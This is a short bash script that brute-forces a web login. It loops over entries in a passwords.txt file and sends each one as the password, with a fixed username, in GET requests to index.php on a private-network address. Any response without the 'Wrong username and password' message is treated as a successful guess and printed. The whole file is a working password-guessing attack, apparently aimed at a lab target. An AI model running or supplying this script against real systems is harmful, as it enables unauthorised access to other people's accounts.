linkStart=("http://192.168.3.151/index.php?username=furkan.paligu&password=")
passwords=$(cat "passwords.txt")

for i in ${passwords}
do 
  test=$(curl -s "$linkStart""$i" | grep "Wrong username and password")
    if [ -z "$test" ]
      then 
      curl "$linkStart""$i" 
    fi
done

